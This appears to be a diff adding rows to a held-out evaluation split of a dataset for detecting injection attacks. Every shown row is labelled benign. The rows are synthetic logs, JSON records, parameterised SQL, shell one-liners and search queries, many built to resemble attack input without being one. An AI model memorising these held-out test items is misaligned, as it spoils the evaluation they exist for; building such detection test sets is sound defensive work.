+2026-08-25 15:00 INFO [http] user='u86' path=/api?id=442 retry,0,benign,benign,held_out
+GET /assets/app.js?v=3.3 200 71ms,0,benign,benign,held_out
+"{""user"": ""alice"", ""note"": ""needs review"", ""qty"": 93}",0,benign,benign,held_out
+2026-08-25 14:06 WARN [http] user='u53' path=/api?id=7 retry,0,benign,benign,held_out
+2026-08-25 14:03 INFO [auth] user='u64' path=/api?id=94 retry,0,benign,benign,held_out
+2026-08-25 18:09 INFO [http] user='u42' path=/api?id=355 200,0,benign,benign,held_out
+"{""query"": ""SELECT name FROM contacts"", ""params"": [9], ""safe"": true}",0,benign,benign,held_out
+"Address: 46 O'Malley Ave, Apt #9, (near park)",0,benign,benign,held_out
+df = df[df['price'] > 97]  # filter,0,benign,benign,held_out
+2026-08-25 10:06 WARN [db] user='u55' path=/api?id=376 retry,0,benign,benign,held_out
+"{""user"": ""alice"", ""note"": ""needs review"", ""qty"": 63}",0,benign,benign,held_out
+GET /assets/app.js?v=4.7 200 80ms,0,benign,benign,held_out
+"Address: 29 O'Malley Ave, Apt #7, (near park)",0,benign,benign,held_out
+2026-08-25 12:08 INFO [auth] user='u11' path=/api?id=686 retry,0,benign,benign,held_out
+"{""user"": ""o'connor"", ""note"": ""needs review"", ""qty"": 3}",0,benign,benign,held_out
+2026-08-25 18:07 WARN [db] user='u39' path=/api?id=24 retry,0,benign,benign,held_out
+GET /assets/app.js?v=9.9 200 90ms,0,benign,benign,held_out
+df = df[df['qty'] > 12]  # filter,0,benign,benign,held_out
+"{""user"": ""o'connor"", ""note"": ""1 < 2 && ok"", ""qty"": 75}",0,benign,benign,held_out
+/search?q=script%20writing%20review,0,benign,benign,held_out
+df = df[df['price'] > 13]  # filter,0,benign,benign,held_out
+2026-08-25 13:09 WARN [auth] user='u18' path=/api?id=298 200,0,benign,benign,held_out
+2026-08-25 10:08 WARN [auth] user='u17' path=/api?id=624 ok,0,benign,benign,held_out
+GET /assets/app.js?v=8.8 200 20ms,0,benign,benign,held_out
+"Address: 75 O'Malley Ave, Apt #3, (near park)",0,benign,benign,held_out
+GET /assets/app.js?v=4.6 200 62ms,0,benign,benign,held_out
+GET /assets/app.js?v=5.3 200 2ms,0,benign,benign,held_out
+2026-08-25 12:00 INFO [db] user='u19' path=/api?id=334 retry,0,benign,benign,held_out
+Discount: buy 2 & save 10%; use code SAVE89 at checkout.,0,benign,benign,held_out
+"Address: 97 O'Malley Ave, Apt #2, (near park)",0,benign,benign,held_out
+"awk -F',' '{print $1}' data.csv",0,benign,benign,held_out
+GET /assets/app.js?v=9.0 200 13ms,0,benign,benign,held_out
+"{""query"": ""SELECT name FROM contacts"", ""params"": [3], ""safe"": true}",0,benign,benign,held_out
+"{""user"": ""alice"", ""note"": ""1 < 2 && ok"", ""qty"": 93}",0,benign,benign,held_out
+"Address: 3 O'Malley Ave, Apt #3, (near park)",0,benign,benign,held_out
+"{""user"": ""alice"", ""note"": ""1 < 2 && ok"", ""qty"": 87}",0,benign,benign,held_out
+2026-08-25 15:04 INFO [http] user='u63' path=/api?id=620 200,0,benign,benign,held_out
+"{""query"": ""SELECT name FROM contacts"", ""params"": [8], ""safe"": true}",0,benign,benign,held_out
+"Address: 16 O'Malley Ave, Apt #7, (near park)",0,benign,benign,held_out
+GET /assets/app.js?v=2.3 200 82ms,0,benign,benign,held_out
+2026-08-25 12:08 WARN [http] user='u58' path=/api?id=872 ok,0,benign,benign,held_out
+Discount: buy 2 & save 10%; use code SAVE32 at checkout.,0,benign,benign,held_out
+/api/v2/users?filter=name%20eq%20John,0,benign,benign,held_out
+Discount: buy 2 & save 10%; use code SAVE26 at checkout.,0,benign,benign,held_out
+df = df[df['qty'] > 62]  # filter,0,benign,benign,held_out
+SELECT name FROM orders WHERE id = %s  -- parameterised,0,benign,benign,held_out
+2026-08-25 19:06 INFO [http] user='u59' path=/api?id=804 retry,0,benign,benign,held_out
+"Address: 45 O'Malley Ave, Apt #1, (near park)",0,benign,benign,held_out
+"{""user"": ""alice"", ""note"": ""needs review"", ""qty"": 91}",0,benign,benign,held_out
+GET /assets/app.js?v=6.5 200 57ms,0,benign,benign,held_out
+"Address: 61 O'Malley Ave, Apt #6, (near park)",0,benign,benign,held_out
+df = df[df['id'] > 38]  # filter,0,benign,benign,held_out
+/search?q=SELECT%20tutorial%202024,0,benign,benign,held_out
+"{""user"": ""alice"", ""note"": ""<3 the team"", ""qty"": 43}",0,benign,benign,held_out
+"{""user"": ""alice"", ""note"": ""1 < 2 && ok"", ""qty"": 41}",0,benign,benign,held_out
+/search?q=drop%20shipping%20near%20me,0,benign,benign,held_out
+/search?q=laptop%20best%20price,0,benign,benign,held_out
+Discount: buy 2 & save 10%; use code SAVE13 at checkout.,0,benign,benign,held_out
+"{""user"": ""alice"", ""note"": ""needs review"", ""qty"": 9}",0,benign,benign,held_out
+2026-08-25 12:05 WARN [db] user='u14' path=/api?id=519 retry,0,benign,benign,held_out
+"{""user"": ""alice"", ""note"": ""needs review"", ""qty"": 68}",0,benign,benign,held_out
+2026-08-25 17:00 WARN [db] user='u26' path=/api?id=537 retry,0,benign,benign,held_out
+"{""query"": ""SELECT name FROM contacts"", ""params"": [1], ""safe"": true}",0,benign,benign,held_out
+"{""user"": ""o'connor"", ""note"": ""<3 the team"", ""qty"": 77}",0,benign,benign,held_out
+Discount: buy 2 & save 10%; use code SAVE84 at checkout.,0,benign,benign,held_out
+2026-08-25 10:03 WARN [auth] user='u16' path=/api?id=819 200,0,benign,benign,held_out
+GET /assets/app.js?v=2.9 200 99ms,0,benign,benign,held_out
+GET /assets/app.js?v=8.4 200 93ms,0,benign,benign,held_out
+/search?q=laptop%20review,0,benign,benign,held_out
+2026-08-25 18:04 INFO [auth] user='u73' path=/api?id=864 retry,0,benign,benign,held_out
+/products?category=books&sort=price,0,benign,benign,held_out
+GET /assets/app.js?v=1.7 200 1ms,0,benign,benign,held_out
+2026-08-25 19:05 INFO [auth] user='u69' path=/api?id=266 200,0,benign,benign,held_out
+2026-08-25 13:08 WARN [db] user='u34' path=/api?id=748 200,0,benign,benign,held_out
+Discount: buy 2 & save 10%; use code SAVE87 at checkout.,0,benign,benign,held_out
+df = df[df['id'] > 86]  # filter,0,benign,benign,held_out
+"{""user"": ""alice"", ""note"": ""1 < 2 && ok"", ""qty"": 65}",0,benign,benign,held_out
+Discount: buy 2 & save 10%; use code SAVE72 at checkout.,0,benign,benign,held_out
+df = df[df['price'] > 24]  # filter,0,benign,benign,held_out
+GET /assets/app.js?v=4.4 200 16ms,0,benign,benign,held_out
+"{""user"": ""o'connor"", ""note"": ""<3 the team"", ""qty"": 90}",0,benign,benign,held_out
+Discount: buy 2 & save 10%; use code SAVE33 at checkout.,0,benign,benign,held_out
+GET /assets/app.js?v=9.8 200 7ms,0,benign,benign,held_out
+/search?q=O%27Brien%20best%20price,0,benign,benign,held_out
+GET /assets/app.js?v=3.8 200 18ms,0,benign,benign,held_out
+Discount: buy 2 & save 10%; use code SAVE97 at checkout.,0,benign,benign,held_out
+df = df[df['id'] > 51]  # filter,0,benign,benign,held_out
+Discount: buy 2 & save 10%; use code SAVE24 at checkout.,0,benign,benign,held_out
+2026-08-25 12:09 INFO [db] user='u65' path=/api?id=949 200,0,benign,benign,held_out
+Discount: buy 2 & save 10%; use code SAVE47 at checkout.,0,benign,benign,held_out
+if (p && q) { return null; },0,benign,benign,held_out
+"{""user"": ""alice"", ""note"": ""1 < 2 && ok"", ""qty"": 81}",0,benign,benign,held_out
+GET /assets/app.js?v=2.8 200 29ms,0,benign,benign,held_out
+"{""user"": ""o'connor"", ""note"": ""1 < 2 && ok"", ""qty"": 46}",0,benign,benign,held_out
+"Address: 82 O'Malley Ave, Apt #4, (near park)",0,benign,benign,held_out
+GET /assets/app.js?v=8.2 200 33ms,0,benign,benign,held_out
+df = df[df['price'] > 96]  # filter,0,benign,benign,held_out
+df = df[df['id'] > 59]  # filter,0,benign,benign,held_out
+/search?q=select%20size%202024,0,benign,benign,held_out
+2026-08-25 10:08 INFO [db] user='u53' path=/api?id=506 retry,0,benign,benign,held_out
+df = df[df['price'] > 17]  # filter,0,benign,benign,held_out
+if (a==b) { return null; },0,benign,benign,held_out
+"Address: 58 O'Malley Ave, Apt #2, (near park)",0,benign,benign,held_out
+"{""user"": ""alice"", ""note"": ""1 < 2 && ok"", ""qty"": 17}",0,benign,benign,held_out
+df = df[df['qty'] > 85]  # filter,0,benign,benign,held_out
+2026-08-25 16:09 WARN [auth] user='u99' path=/api?id=923 200,0,benign,benign,held_out
+Discount: buy 2 & save 10%; use code SAVE15 at checkout.,0,benign,benign,held_out
+2026-08-25 18:09 WARN [db] user='u56' path=/api?id=930 200,0,benign,benign,held_out
+GET /assets/app.js?v=6.2 200 1ms,0,benign,benign,held_out
+GET /assets/app.js?v=1.7 200 19ms,0,benign,benign,held_out
+GET /assets/app.js?v=1.6 200 35ms,0,benign,benign,held_out
+/search?q=red%20%26%20blue%20review,0,benign,benign,held_out
+/products?category=drop-crotch&sort=name,0,benign,benign,held_out
+"{""user"": ""o'connor"", ""note"": ""needs review"", ""qty"": 1}",0,benign,benign,held_out
+"Address: 43 O'Malley Ave, Apt #8, (near park)",0,benign,benign,held_out
+df = df[df['price'] > 41]  # filter,0,benign,benign,held_out
+2026-08-25 11:06 INFO [db] user='u89' path=/api?id=568 200,0,benign,benign,held_out
+"Address: 41 O'Malley Ave, Apt #3, (near park)",0,benign,benign,held_out
+Discount: buy 2 & save 10%; use code SAVE73 at checkout.,0,benign,benign,held_out
+GET /assets/app.js?v=7.4 200 13ms,0,benign,benign,held_out
+"{""user"": ""alice"", ""note"": ""<3 the team"", ""qty"": 95}",0,benign,benign,held_out
+GET /assets/app.js?v=2.4 200 41ms,0,benign,benign,held_out
+Discount: buy 2 & save 10%; use code SAVE80 at checkout.,0,benign,benign,held_out
+GET /assets/app.js?v=4.4 200 13ms,0,benign,benign,held_out
+df = df[df['qty'] > 40]  # filter,0,benign,benign,held_out
+GET /assets/app.js?v=7.6 200 4ms,0,benign,benign,held_out
+df = df[df['id'] > 15]  # filter,0,benign,benign,held_out
+2026-08-25 16:02 WARN [http] user='u64' path=/api?id=231 retry,0,benign,benign,held_out
+"Re: contract clause 3 — please DELETE the ""insert"" line & re-send.",0,benign,benign,held_out
+2026-08-25 11:00 WARN [auth] user='u82' path=/api?id=190 200,0,benign,benign,held_out
+Discount: buy 2 & save 10%; use code SAVE28 at checkout.,0,benign,benign,held_out
+GET /assets/app.js?v=7.7 200 46ms,0,benign,benign,held_out
+Discount: buy 2 & save 10%; use code SAVE41 at checkout.,0,benign,benign,held_out
+2026-08-25 11:01 INFO [http] user='u45' path=/api?id=634 ok,0,benign,benign,held_out
+"{""user"": ""o'connor"", ""note"": ""needs review"", ""qty"": 9}",0,benign,benign,held_out
+"{""user"": ""alice"", ""note"": ""<3 the team"", ""qty"": 89}",0,benign,benign,held_out
+GET /assets/app.js?v=9.6 200 57ms,0,benign,benign,held_out
+SELECT email FROM users WHERE id = %s  -- parameterised,0,benign,benign,held_out
+"{""user"": ""alice"", ""note"": ""1 < 2 && ok"", ""qty"": 36}",0,benign,benign,held_out
+"Address: 14 O'Malley Ave, Apt #6, (near park)",0,benign,benign,held_out
+2026-08-25 14:02 INFO [db] user='u59' path=/api?id=83 200,0,benign,benign,held_out
+GET /assets/app.js?v=7.2 200 41ms,0,benign,benign,held_out
+"Address: 11 O'Malley Ave, Apt #3, (near park)",0,benign,benign,held_out
+2026-08-25 11:05 INFO [auth] user='u95' path=/api?id=549 retry,0,benign,benign,held_out
+GET /assets/app.js?v=7.8 200 66ms,0,benign,benign,held_out
+"{""user"": ""o'connor"", ""note"": ""<3 the team"", ""qty"": 97}",0,benign,benign,held_out
+df = df[df['price'] > 49]  # filter,0,benign,benign,held_out
+2026-08-25 15:03 WARN [auth] user='u25' path=/api?id=768 ok,0,benign,benign,held_out
+"{""user"": ""alice"", ""note"": ""needs review"", ""qty"": 25}",0,benign,benign,held_out
+2026-08-25 18:09 INFO [db] user='u93' path=/api?id=5 200,0,benign,benign,held_out
+"Address: 22 O'Malley Ave, Apt #1, (near park)",0,benign,benign,held_out
+/search?q=AND/OR%20logic%20near%20me,0,benign,benign,held_out
+GET /assets/app.js?v=1.3 200 63ms,0,benign,benign,held_out
+df = df[df['price'] > 18]  # filter,0,benign,benign,held_out
+df = df[df['id'] > 8]  # filter,0,benign,benign,held_out
+"{""user"": ""alice"", ""note"": ""<3 the team"", ""qty"": 34}",0,benign,benign,held_out
+df = df[df['id'] > 30]  # filter,0,benign,benign,held_out
+2026-08-25 14:00 WARN [db] user='u33' path=/api?id=211 ok,0,benign,benign,held_out
+Discount: buy 2 & save 10%; use code SAVE27 at checkout.,0,benign,benign,held_out
+"awk -F',' '{print $2}' data.csv",0,benign,benign,held_out
+GET /assets/app.js?v=1.7 200 99ms,0,benign,benign,held_out
+GET /assets/app.js?v=7.8 200 97ms,0,benign,benign,held_out
+GET /assets/app.js?v=6.2 200 9ms,0,benign,benign,held_out
+2026-08-25 19:03 INFO [http] user='u61' path=/api?id=869 200,0,benign,benign,held_out
+2026-08-25 14:03 WARN [auth] user='u38' path=/api?id=818 200,0,benign,benign,held_out
+"Address: 27 O'Malley Ave, Apt #5, (near park)",0,benign,benign,held_out
+Discount: buy 2 & save 10%; use code SAVE44 at checkout.,0,benign,benign,held_out
+GET /assets/app.js?v=6.6 200 13ms,0,benign,benign,held_out
+2026-08-25 14:02 INFO [http] user='u20' path=/api?id=163 retry,0,benign,benign,held_out
+2026-08-25 18:01 WARN [http] user='u71' path=/api?id=550 ok,0,benign,benign,held_out
+"{""user"": ""alice"", ""note"": ""<3 the team"", ""qty"": 76}",0,benign,benign,held_out
+2026-08-25 19:02 INFO [auth] user='u55' path=/api?id=641 ok,0,benign,benign,held_out
+GET /assets/app.js?v=5.3 200 75ms,0,benign,benign,held_out
+Discount: buy 2 & save 10%; use code SAVE59 at checkout.,0,benign,benign,held_out
+"{""user"": ""alice"", ""note"": ""<3 the team"", ""qty"": 46}",0,benign,benign,held_out
+GET /assets/app.js?v=2.4 200 70ms,0,benign,benign,held_out
+df = df[df['price'] > 77]  # filter,0,benign,benign,held_out
+2026-08-25 13:09 WARN [auth] user='u68' path=/api?id=108 ok,0,benign,benign,held_out
+Discount: buy 2 & save 10%; use code SAVE45 at checkout.,0,benign,benign,held_out
+2026-08-25 15:05 INFO [http] user='u70' path=/api?id=874 retry,0,benign,benign,held_out
+2026-08-25 13:01 INFO [db] user='u7' path=/api?id=186 ok,0,benign,benign,held_out
+df = df[df['id'] > 81]  # filter,0,benign,benign,held_out
+GET /assets/app.js?v=6.8 200 7ms,0,benign,benign,held_out
+2026-08-25 10:06 INFO [db] user='u91' path=/api?id=33 retry,0,benign,benign,held_out
+"Address: 99 O'Malley Ave, Apt #9, (near park)",0,benign,benign,held_out
+2026-08-25 14:08 INFO [db] user='u42' path=/api?id=23 200,0,benign,benign,held_out
+df = df[df['price'] > 10]  # filter,0,benign,benign,held_out
+"Address: 70 O'Malley Ave, Apt #8, (near park)",0,benign,benign,held_out
+/search?q=union%20station%20near%20me,0,benign,benign,held_out
+2026-08-25 13:05 INFO [http] user='u53' path=/api?id=644 ok,0,benign,benign,held_out
+"{""user"": ""o'connor"", ""note"": ""<3 the team"", ""qty"": 54}",0,benign,benign,held_out
+"{""user"": ""alice"", ""note"": ""needs review"", ""qty"": 56}",0,benign,benign,held_out
+Discount: buy 2 & save 10%; use code SAVE18 at checkout.,0,benign,benign,held_out
+df = df[df['qty'] > 7]  # filter,0,benign,benign,held_out
+2026-08-25 13:00 INFO [http] user='u32' path=/api?id=582 retry,0,benign,benign,held_out
+"{""user"": ""alice"", ""note"": ""needs review"", ""qty"": 81}",0,benign,benign,held_out
+GET /assets/app.js?v=7.9 200 21ms,0,benign,benign,held_out
+2026-08-25 15:08 INFO [db] user='u47' path=/api?id=93 retry,0,benign,benign,held_out
+2026-08-25 10:03 INFO [db] user='u96' path=/api?id=842 ok,0,benign,benign,held_out
+Discount: buy 2 & save 10%; use code SAVE95 at checkout.,0,benign,benign,held_out
+/search?q=select%20size%20near%20me,0,benign,benign,held_out
+GET /assets/app.js?v=2.9 200 43ms,0,benign,benign,held_out
+df = df[df['id'] > 73]  # filter,0,benign,benign,held_out
+Discount: buy 2 & save 10%; use code SAVE57 at checkout.,0,benign,benign,held_out
+2026-08-25 10:08 INFO [db] user='u61' path=/api?id=585 retry,0,benign,benign,held_out
+/search?q=admin%20panel%20guide%20review,0,benign,benign,held_out
+df = df[df['id'] > 70]  # filter,0,benign,benign,held_out
+SELECT email FROM orders WHERE id = %s  -- parameterised,0,benign,benign,held_out
+/search?q=SELECT%20tutorial%20best%20price,0,benign,benign,held_out
+GET /assets/app.js?v=2.3 200 59ms,0,benign,benign,held_out
+GET /assets/app.js?v=5.8 200 38ms,0,benign,benign,held_out
+df = df[df['price'] > 75]  # filter,0,benign,benign,held_out
+"Address: 64 O'Malley Ave, Apt #3, (near park)",0,benign,benign,held_out
+"{""user"": ""o'connor"", ""note"": ""1 < 2 && ok"", ""qty"": 80}",0,benign,benign,held_out
+/search?q=order%20by%20phone%20near%20me,0,benign,benign,held_out
+2026-08-25 14:00 INFO [http] user='u33' path=/api?id=397 200,0,benign,benign,held_out
+df = df[df['id'] > 93]  # filter,0,benign,benign,held_out
+GET /assets/app.js?v=2.2 200 7ms,0,benign,benign,held_out
+df = df[df['price'] > 2]  # filter,0,benign,benign,held_out
+"{""user"": ""alice"", ""note"": ""<3 the team"", ""qty"": 48}",0,benign,benign,held_out
+"Given a > b and b > c, prove a > c. (transitivity)",0,benign,benign,held_out
+"{""user"": ""alice"", ""note"": ""<3 the team"", ""qty"": 82}",0,benign,benign,held_out
+Discount: buy 2 & save 10%; use code SAVE11 at checkout.,0,benign,benign,held_out
+"Address: 72 O'Malley Ave, Apt #2, (near park)",0,benign,benign,held_out
+"Address: 35 O'Malley Ave, Apt #8, (near park)",0,benign,benign,held_out
+GET /assets/app.js?v=4.7 200 50ms,0,benign,benign,held_out
+"Address: 75 O'Malley Ave, Apt #8, (near park)",0,benign,benign,held_out
+GET /assets/app.js?v=3.6 200 77ms,0,benign,benign,held_out
+2026-08-25 19:00 WARN [auth] user='u20' path=/api?id=383 ok,0,benign,benign,held_out
+"{""user"": ""o'connor"", ""note"": ""<3 the team"", ""qty"": 79}",0,benign,benign,held_out
+"Address: 47 O'Malley Ave, Apt #3, (near park)",0,benign,benign,held_out
+df = df[df['id'] > 53]  # filter,0,benign,benign,held_out
+"Address: 18 O'Malley Ave, Apt #8, (near park)",0,benign,benign,held_out
+"{""user"": ""alice"", ""note"": ""1 < 2 && ok"", ""qty"": 64}",0,benign,benign,held_out
+df = df[df['price'] > 93]  # filter,0,benign,benign,held_out
+"Address: 36 O'Malley Ave, Apt #2, (near park)",0,benign,benign,held_out
+"Address: 94 O'Malley Ave, Apt #6, (near park)",0,benign,benign,held_out
+"Address: 7 O'Malley Ave, Apt #4, (near park)",0,benign,benign,held_out
+2026-08-25 18:01 INFO [http] user='u14' path=/api?id=895 ok,0,benign,benign,held_out
+GET /assets/app.js?v=4.0 200 76ms,0,benign,benign,held_out
+grep -rn 'TODO' src/ | wc -l,0,benign,benign,held_out
+if (n%2==0) { return null; },0,benign,benign,held_out
+df = df[df['price'] > 56]  # filter,0,benign,benign,held_out
+GET /assets/app.js?v=6.2 200 55ms,0,benign,benign,held_out
+"Address: 75 O'Malley Ave, Apt #2, (near park)",0,benign,benign,held_out
+"Address: 71 O'Malley Ave, Apt #8, (near park)",0,benign,benign,held_out
+2026-08-25 15:08 INFO [db] user='u2' path=/api?id=257 ok,0,benign,benign,held_out
+"Address: 67 O'Malley Ave, Apt #1, (near park)",0,benign,benign,held_out
+df = df[df['price'] > 27]  # filter,0,benign,benign,held_out
+df = df[df['id'] > 77]  # filter,0,benign,benign,held_out
+/search?q=admin%20panel%20guide%202024,0,benign,benign,held_out
+GET /assets/app.js?v=3.6 200 79ms,0,benign,benign,held_out
+"{""user"": ""alice"", ""note"": ""<3 the team"", ""qty"": 84}",0,benign,benign,held_out
+df = df[df['id'] > 41]  # filter,0,benign,benign,held_out
+/search?q=union%20station%202024,0,benign,benign,held_out
+2026-08-25 17:05 INFO [db] user='u84' path=/api?id=895 retry,0,benign,benign,held_out
+"Address: 5 O'Malley Ave, Apt #7, (near park)",0,benign,benign,held_out
+"Address: 21 O'Malley Ave, Apt #9, (near park)",0,benign,benign,held_out
+if (p && q) { return true; },0,benign,benign,held_out
+GET /assets/app.js?v=4.0 200 71ms,0,benign,benign,held_out
+Discount: buy 2 & save 10%; use code SAVE46 at checkout.,0,benign,benign,held_out
+Discount: buy 2 & save 10%; use code SAVE94 at checkout.,0,benign,benign,held_out
+GET /assets/app.js?v=2.8 200 55ms,0,benign,benign,held_out
+2026-08-25 13:09 INFO [http] user='u96' path=/api?id=149 200,0,benign,benign,held_out
+"{""user"": ""alice"", ""note"": ""1 < 2 && ok"", ""qty"": 22}",0,benign,benign,held_out
+2026-08-25 17:04 WARN [db] user='u37' path=/api?id=277 200,0,benign,benign,held_out
+"Address: 65 O'Malley Ave, Apt #2, (near park)",0,benign,benign,held_out
+Discount: buy 2 & save 10%; use code SAVE68 at checkout.,0,benign,benign,held_out
+/search?q=invoice%20best%20price,0,benign,benign,held_out
+"Address: 37 O'Malley Ave, Apt #7, (near park)",0,benign,benign,held_out
+/search?q=order%20by%20phone%202024,0,benign,benign,held_out
+GET /assets/app.js?v=2.3 200 26ms,0,benign,benign,held_out
+df = df[df['qty'] > 11]  # filter,0,benign,benign,held_out
+Discount: buy 2 & save 10%; use code SAVE88 at checkout.,0,benign,benign,held_out
+2026-08-25 16:08 WARN [db] user='u75' path=/api?id=280 ok,0,benign,benign,held_out
+"{""user"": ""o'connor"", ""note"": ""1 < 2 && ok"", ""qty"": 34}",0,benign,benign,held_out
+/search?q=O%27Brien%20review,0,benign,benign,held_out
+"{""user"": ""o'connor"", ""note"": ""1 < 2 && ok"", ""qty"": 21}",0,benign,benign,held_out
+/search?q=laptop%20near%20me,0,benign,benign,held_out
+df = df[df['id'] > 82]  # filter,0,benign,benign,held_out
+df = df[df['qty'] > 57]  # filter,0,benign,benign,held_out
+GET /assets/app.js?v=3.5 200 67ms,0,benign,benign,held_out
+2026-08-25 13:07 WARN [auth] user='u18' path=/api?id=781 200,0,benign,benign,held_out
+/search?q=select%20size%20review,0,benign,benign,held_out
+df = df[df['id'] > 52]  # filter,0,benign,benign,held_out
+"{""user"": ""o'connor"", ""note"": ""1 < 2 && ok"", ""qty"": 52}",0,benign,benign,held_out
+GET /assets/app.js?v=3.0 200 6ms,0,benign,benign,held_out
+2026-08-25 17:03 WARN [db] user='u46' path=/api?id=797 ok,0,benign,benign,held_out
+Discount: buy 2 & save 10%; use code SAVE76 at checkout.,0,benign,benign,held_out
+Discount: buy 2 & save 10%; use code SAVE42 at checkout.,0,benign,benign,held_out
+"Address: 79 O'Malley Ave, Apt #9, (near park)",0,benign,benign,held_out
+df = df[df['price'] > 9]  # filter,0,benign,benign,held_out
+"Address: 15 O'Malley Ave, Apt #3, (near park)",0,benign,benign,held_out
+"Address: 44 O'Malley Ave, Apt #8, (near park)",0,benign,benign,held_out
+df = df[df['qty'] > 69]  # filter,0,benign,benign,held_out
+Discount: buy 2 & save 10%; use code SAVE91 at checkout.,0,benign,benign,held_out
+GET /assets/app.js?v=9.2 200 95ms,0,benign,benign,held_out
+2026-08-25 17:06 WARN [db] user='u41' path=/api?id=804 retry,0,benign,benign,held_out
+df = df[df['price'] > 12]  # filter,0,benign,benign,held_out
+df = df[df['price'] > 73]  # filter,0,benign,benign,held_out
+2026-08-25 16:00 INFO [db] user='u73' path=/api?id=769 ok,0,benign,benign,held_out
+GET /assets/app.js?v=7.0 200 44ms,0,benign,benign,held_out
+2026-08-25 10:07 WARN [auth] user='u4' path=/api?id=556 200,0,benign,benign,held_out
+"Address: 50 O'Malley Ave, Apt #2, (near park)",0,benign,benign,held_out
+GET /assets/app.js?v=7.7 200 7ms,0,benign,benign,held_out
+df = df[df['qty'] > 97]  # filter,0,benign,benign,held_out
+Discount: buy 2 & save 10%; use code SAVE35 at checkout.,0,benign,benign,held_out
+2026-08-25 12:04 INFO [db] user='u8' path=/api?id=152 200,0,benign,benign,held_out
+GET /assets/app.js?v=8.8 200 25ms,0,benign,benign,held_out
+2026-08-25 17:09 INFO [http] user='u29' path=/api?id=182 retry,0,benign,benign,held_out
+2026-08-25 16:01 INFO [db] user='u74' path=/api?id=762 retry,0,benign,benign,held_out
+/search?q=laptop%202024,0,benign,benign,held_out
+2026-08-25 14:03 WARN [http] user='u59' path=/api?id=447 ok,0,benign,benign,held_out
+"{""user"": ""o'connor"", ""note"": ""<3 the team"", ""qty"": 45}",0,benign,benign,held_out
+GET /assets/app.js?v=5.1 200 57ms,0,benign,benign,held_out
+Discount: buy 2 & save 10%; use code SAVE56 at checkout.,0,benign,benign,held_out
+Discount: buy 2 & save 10%; use code SAVE31 at checkout.,0,benign,benign,held_out
+"Address: 64 O'Malley Ave, Apt #2, (near park)",0,benign,benign,held_out
+Discount: buy 2 & save 10%; use code SAVE17 at checkout.,0,benign,benign,held_out
+df = df[df['id'] > 10]  # filter,0,benign,benign,held_out
+2026-08-25 16:08 WARN [db] user='u68' path=/api?id=74 retry,0,benign,benign,held_out
+2026-08-25 18:07 WARN [auth] user='u53' path=/api?id=690 ok,0,benign,benign,held_out
+GET /assets/app.js?v=4.3 200 90ms,0,benign,benign,held_out
+"Address: 91 O'Malley Ave, Apt #9, (near park)",0,benign,benign,held_out
+"Address: 28 O'Malley Ave, Apt #1, (near park)",0,benign,benign,held_out
+/search?q=SELECT%20tutorial%20review,0,benign,benign,held_out
+2026-08-25 10:07 INFO [http] user='u73' path=/api?id=366 ok,0,benign,benign,held_out
+if (p && q) { return -1; },0,benign,benign,held_out
+GET /assets/app.js?v=9.9 200 10ms,0,benign,benign,held_out
+df = df[df['price'] > 85]  # filter,0,benign,benign,held_out
+Discount: buy 2 & save 10%; use code SAVE78 at checkout.,0,benign,benign,held_out
+"{""user"": ""o'connor"", ""note"": ""<3 the team"", ""qty"": 64}",0,benign,benign,held_out
+/search?q=O%27Brien%20near%20me,0,benign,benign,held_out
+2026-08-25 11:04 WARN [db] user='u80' path=/api?id=715 ok,0,benign,benign,held_out
+"Address: 65 O'Malley Ave, Apt #7, (near park)",0,benign,benign,held_out
+2026-08-25 16:09 INFO [db] user='u3' path=/api?id=46 ok,0,benign,benign,held_out
+"{""user"": ""alice"", ""note"": ""1 < 2 && ok"", ""qty"": 68}",0,benign,benign,held_out
+"Address: 58 O'Malley Ave, Apt #1, (near park)",0,benign,benign,held_out
+GET /assets/app.js?v=1.3 200 33ms,0,benign,benign,held_out
+const url = `https://api.x.io/v1/orders?limit=${n}`;,0,benign,benign,held_out
+2026-08-25 13:05 WARN [auth] user='u95' path=/api?id=972 retry,0,benign,benign,held_out
+df = df[df['price'] > 91]  # filter,0,benign,benign,held_out
+df = df[df['qty'] > 13]  # filter,0,benign,benign,held_out
+df = df[df['qty'] > 46]  # filter,0,benign,benign,held_out
+2026-08-25 17:07 INFO [db] user='u60' path=/api?id=535 200,0,benign,benign,held_out
+"{""user"": ""o'connor"", ""note"": ""needs review"", ""qty"": 12}",0,benign,benign,held_out
+GET /assets/app.js?v=2.9 200 8ms,0,benign,benign,held_out
+"Address: 59 O'Malley Ave, Apt #2, (near park)",0,benign,benign,held_out
+2026-08-25 16:04 INFO [auth] user='u82' path=/api?id=869 200,0,benign,benign,held_out
+df = df[df['qty'] > 9]  # filter,0,benign,benign,held_out
+GET /assets/app.js?v=5.4 200 56ms,0,benign,benign,held_out
+2026-08-25 16:06 WARN [auth] user='u13' path=/api?id=827 retry,0,benign,benign,held_out
+"Address: 43 O'Malley Ave, Apt #1, (near park)",0,benign,benign,held_out
+"Address: 38 O'Malley Ave, Apt #9, (near park)",0,benign,benign,held_out
+GET /assets/app.js?v=8.0 200 84ms,0,benign,benign,held_out
+2026-08-25 19:09 WARN [db] user='u28' path=/api?id=498 retry,0,benign,benign,held_out
+"{""user"": ""alice"", ""note"": ""1 < 2 && ok"", ""qty"": 52}",0,benign,benign,held_out
+Discount: buy 2 & save 10%; use code SAVE58 at checkout.,0,benign,benign,held_out
+GET /assets/app.js?v=6.6 200 43ms,0,benign,benign,held_out
+df = df[df['qty'] > 79]  # filter,0,benign,benign,held_out
+GET /assets/app.js?v=4.3 200 13ms,0,benign,benign,held_out
+"awk -F',' '{print $3}' data.csv",0,benign,benign,held_out
+Discount: buy 2 & save 10%; use code SAVE21 at checkout.,0,benign,benign,held_out
+"{""user"": ""alice"", ""note"": ""needs review"", ""qty"": 92}",0,benign,benign,held_out
+/search?q=order%20by%20phone%20review,0,benign,benign,held_out
+/search?q=1%3D1%20meme%20best%20price,0,benign,benign,held_out
+GET /assets/app.js?v=8.1 200 59ms,0,benign,benign,held_out
+Discount: buy 2 & save 10%; use code SAVE99 at checkout.,0,benign,benign,held_out
+"Address: 80 O'Malley Ave, Apt #9, (near park)",0,benign,benign,held_out
+2026-08-25 18:02 INFO [db] user='u8' path=/api?id=717 ok,0,benign,benign,held_out
+"{""user"": ""o'connor"", ""note"": ""<3 the team"", ""qty"": 44}",0,benign,benign,held_out
+"Address: 63 O'Malley Ave, Apt #3, (near park)",0,benign,benign,held_out
+"Address: 22 O'Malley Ave, Apt #5, (near park)",0,benign,benign,held_out
+2026-08-25 13:09 INFO [auth] user='u71' path=/api?id=816 retry,0,benign,benign,held_out
